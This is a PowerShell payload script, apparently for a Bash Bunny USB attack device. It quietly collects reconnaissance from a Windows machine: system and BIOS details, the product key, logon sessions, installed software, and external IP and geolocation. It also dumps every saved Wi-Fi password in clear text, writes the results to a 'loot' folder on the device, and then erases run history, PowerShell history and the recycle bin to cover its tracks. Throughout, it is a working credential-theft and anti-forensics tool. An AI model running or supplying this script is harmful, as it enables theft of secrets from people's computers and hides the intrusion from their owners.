#Define script variables
$ErrorActionPreference = "SilentlyContinue";
$hostname = $env:computername;
#-----------------------------------------------------------
# CREATE BASIC LOOT DIR
#-----------------------------------------------------------
$destFile = ("$env:COMPUTERNAME-{0:yyyy-MM-dd-HH-mm-ss}.log" -f (Get-Date))
$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name;
$destPath = $bb+"loot\Recon";
$dest = "$destPath\$destFile";
New-Item -ItemType Directory -Force -Path $destPath;

#-----------------------------------------------------------
# CREATE BASIC SYSTEM INFORMATION
#-----------------------------------------------------------
Add-Content -Path $dest -Value "BIOS Information:"; 
Get-WmiObject -Class Win32_BIOS -ComputerName . | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Basic Computer Info:";
Get-WmiObject -Class Win32_ComputerSystem | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Detailed Computer Info:";
Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, Version, OSArchitecture, OSLanguage, OSType, OSProductSuite, ServicePackMajorVersion, ServicePackMinorVersion, SuiteMask, Buildnumber, CSName, RegisteredUser, SerialNumber, InstallDate, BootDevice, SystemDevice, SystemDirectory, SystemDrive, WindowsDirectory, LastBootUpTime, LocalDateTime, CountryCode, FreePhysicalMemory, FreeVirtualMemory, CurrentTimeZone, NumberOfProcesses, NumberOfUsers, DataExecutionPrevention_Available, DataExecutionPrevention_32BitApplications | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Windows Serial Key:";
(Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Disk Space Info:";
Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" -ComputerName . | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Installed Hotfixes:";
Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName . | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Session Logon Information:";
Get-WmiObject -Class Win32_LogonSession -ComputerName . | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Service Information:";
Get-WmiObject -Class Win32_Service -ComputerName . | Format-Table -Property Status,Name,DisplayName -AutoSize -Wrap | FL | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "Installed Software:";
Get-WmiObject -Class Win32_Product | Select-Object -Property Name | Sort-Object Name | Out-File -Append -FilePath $dest -Encoding ASCII;
#-----------------------------------------------------------
# Network addresses
#-----------------------------------------------------------
Add-Content -Path $dest -Value "Network Infomation:";
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-File -Append -FilePath $dest -Encoding ASCII;
Add-Content -Path $dest -Value "External IP and Geolocation:";
Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content) | Out-File -Append -FilePath $dest -Encoding ASCII;
#-----------------------------------------------------------
# WIFI KEYS
#-----------------------------------------------------------
Add-Content -Path $dest -Value "Wireless Infomation:";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-File -Append -FilePath $dest -Encoding ASCII;
#-----------------------------------------------------------
# CLEAR TRACKS
#-----------------------------------------------------------
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;
Remove-Item (Get-PSreadlineOption).HistorySavePath;
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;
#-----------------------------------------------------------
# FORCE EJECT OF BASHBUNNY
#-----------------------------------------------------------
$Ejectblock = {
$driveEject = New-Object -comObject Shell.Application;
$driveEject.Namespace(17).ParseName($args[0]).InvokeVerb('Eject');
}
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -w h -command (Invoke-Command -Scriptblock {$Ejectblock} -ArgumentList '$bb')";
exit